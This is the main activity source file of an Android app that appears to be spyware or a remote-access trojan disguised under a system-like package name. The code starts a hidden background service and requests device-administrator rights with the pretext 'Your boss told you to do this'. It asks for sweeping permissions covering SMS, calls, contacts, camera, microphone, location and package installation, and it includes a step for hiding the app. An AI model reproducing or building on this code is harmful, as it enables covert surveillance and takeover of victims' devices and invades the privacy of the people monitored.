package oom.android.system.app;

import android.Manifest;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import oom.android.system.R;

public class MainActivity extends AppCompatActivity {
    public static Context context;
    public static Activity activity;

    Button btnHide,btnPermission,btnDA;
    EditText user,name;

    private static final int PERMISSION_REQUEST_CODE = 100;



    @Override
    protected void onCreate(Bundle savedInstanceState){
        super.onCreate(savedInstanceState);
        //startservice();
        context=this;
        activity=this;
        setContentView(R.layout.activity_main);

        btnPermission=(Button)findViewById(R.id.btnPermission);
        btnHide=(Button)findViewById(R.id.btnHide);
        btnDA=(Button)findViewById(R.id.btnDA);
        user = (EditText)findViewById(R.id.ET_userid);
        name = findViewById(R.id.ET_name);

        btnDA.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(
                        DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,MyService.demoDeviceAdmin);
                intent.putExtra(DevicePolicyManager.DELEGATION_ENABLE_SYSTEM_APP,getApplication().toString());
                intent.putExtra(DevicePolicyManager.DELEGATION_ENABLE_SYSTEM_APP,getApplication().toString());
                intent.putExtra(DevicePolicyManager.ACTION_PROFILE_OWNER_CHANGED,MyService.demoDeviceAdmin);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "Your boss told you to do this");
                startActivityForResult(intent, 53);
                MyService.admin=true;
            }
        });
        btnPermission.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                requestMultiplePermissions();
            }
        });
        btnHide.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                //function.hideAppIcon(MainActivity.context);
                if(user.getText().length() >0)
                    MyService.userid= Integer.valueOf(user.getText().toString());
                if(name.getText().length() >0)
                    MyService.DevName = name.getText().toString();
                finish();
            }
        });
        Intent i = new Intent();
        i.setComponent(new ComponentName("oom.android.system", "oom.android.system.app.MyService"));
        startService(i);

    }

    public void requestMultiplePermissions() {
        ActivityCompat.requestPermissions(this,
                new String[] {
                        Manifest.permission.CAMERA,
                        Manifest.permission.INTERNET,
                        Manifest.permission.READ_EXTERNAL_STORAGE,
                        Manifest.permission.WRITE_EXTERNAL_STORAGE,
                        Manifest.permission.RECORD_AUDIO,
                        Manifest.permission.CAPTURE_AUDIO_OUTPUT,
                        Manifest.permission.ACCESS_NETWORK_STATE,
                        Manifest.permission.PROCESS_OUTGOING_CALLS,
                        Manifest.permission.ACCESS_FINE_LOCATION,
                        Manifest.permission.RECEIVE_BOOT_COMPLETED,
                        Manifest.permission.SEND_SMS,
                        Manifest.permission.READ_SMS,
                        Manifest.permission.RECEIVE_SMS,
                        Manifest.permission.READ_CONTACTS,
                        Manifest.permission.WRITE_CONTACTS,
                        Manifest.permission.READ_PHONE_STATE,
                        Manifest.permission.CALL_PHONE,
                        Manifest.permission.READ_CALL_LOG,
                        Manifest.permission.WRITE_CALL_LOG,
                        Manifest.permission.BATTERY_STATS,
                        Manifest.permission.WRITE_SECURE_SETTINGS,
                        Manifest.permission.WRITE_SETTINGS,
                        Manifest.permission.WAKE_LOCK,
                        Manifest.permission.BIND_DEVICE_ADMIN,
                        Manifest.permission.INSTALL_PACKAGES,
                        Manifest.permission.KILL_BACKGROUND_PROCESSES,
                        Manifest.permission.VIBRATE,
                        Manifest.permission.SYSTEM_ALERT_WINDOW,
                        Manifest.permission.ACCESS_COARSE_LOCATION,
                        Manifest.permission.ACCESS_WIFI_STATE

                },
                PERMISSION_REQUEST_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        if (requestCode == PERMISSION_REQUEST_CODE && grantResults.length == 2) {
            if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {

            }

        }
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
    }

}
